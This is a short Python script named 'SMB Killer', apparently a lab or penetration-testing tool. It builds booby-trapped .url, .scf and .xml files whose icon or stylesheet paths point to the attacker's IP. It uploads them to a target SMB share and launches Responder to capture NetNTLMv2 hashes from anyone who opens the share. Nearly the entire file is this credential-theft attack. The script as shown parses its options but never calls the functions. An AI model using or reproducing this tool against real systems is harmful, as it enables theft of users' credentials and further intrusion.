#!/usr/bin/env python3 

import os
import argparse
import sys

ip = "10.10.0.16" #change this
interface = "tun0" #change this
rhost = "172.31.1.4" #change this
share = "Office_Share" #change this to rhost share
domain = "secret" #change this to domain name
username = "" #leave blank for anonymous access
password = "" #leave blank for anonymous access

print("\033[1;31m Script used for SMB when uploading file to get NetNTLMv2 hash") #red text
print("")
print("\033[1;32m Make sure to change IP, interface, rhost, share and domain. If no username or password is needed then leave blank")
print("\033[1;39m ")

parser = argparse.ArgumentParser(description="SMB Killer",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-u", "--url", action="store_true", help="URL File")
parser.add_argument("-s", "--scf", action="store_true", help="SCF File")
parser.add_argument("-x", "--xml", action="store_true", help="XML File")
args = parser.parse_args()

def url(ip):
	print("")
	print("\033[1;31m Making @evil.url")
	print("\033[1;39m ") #returns to white text
	f = open("@evil.url", "w")
	template = f"""[InternetShortcut]\n
URL=whatever\n
WorkingDirectory=whatever\n
IconFile=\\\\"""+ip+"""\\%USERNAME%.icon\n
IconIndex=1"""
	f.write(template)
	print("\033[1;31m Putting file into smb server, once done exit out of SMB Server and responder will automatically start")
	print("")
	input("\033[1;32m Press enter to continue")
	print("\033[1;39m ") #returns to white text
	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""")
	os.system("""sudo responder -I """+interface+""" -wv""") 

def scf(ip):
	print("")
	print("\033[1;31m Making @evil.scf")
	print("\033[1;39m ") #returns to white text
	f = open("@evil.scf", "w")
	template= f"""[Shell]\n
Command=2\n
IconFile=\\\\"""+ip+"""\\tools\\nc.ico\n
[Taskbar]\n
Command=ToggleDesktop"""
	f.write(template)
	print("\033[1;31m Putting file into smb server")
	print("")
	input("\033[1;32m Press enter to continue")
	print("\033[1;39m ") #returns to white text
	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""") 
	os.system("""sudo responder -I """+interface+""" -wv""") 

def xml(ip):
	print("")
	print("\033[1;31m Making @evil.xml")
	print("\033[1;39m ") #returns to white text
	f = open("@evil.xml", "w")
	template= f"""("<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
	"<?mso-application progid='Word.Document'?>\n"
	"<?xml-stylesheet type='text/xsl' href='\\\\"""+ip+"""\\evil.xsl' ?>")"""
	f.write(template)
	print("\033[1;31m Putting file into smb server, once done exit out of SMB Server and responder will automatically start")
	print("")
	input("\033[1;32m Press enter to continue")
	print("\033[1;39m ") #returns to white text
	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""")
	os.system("""sudo responder -I """+interface+""" -wv""")  

#Thank you dze64 for all the help while making this, he made it much better but I wanted / needed to learn some python, had a lot of fun making this and learning
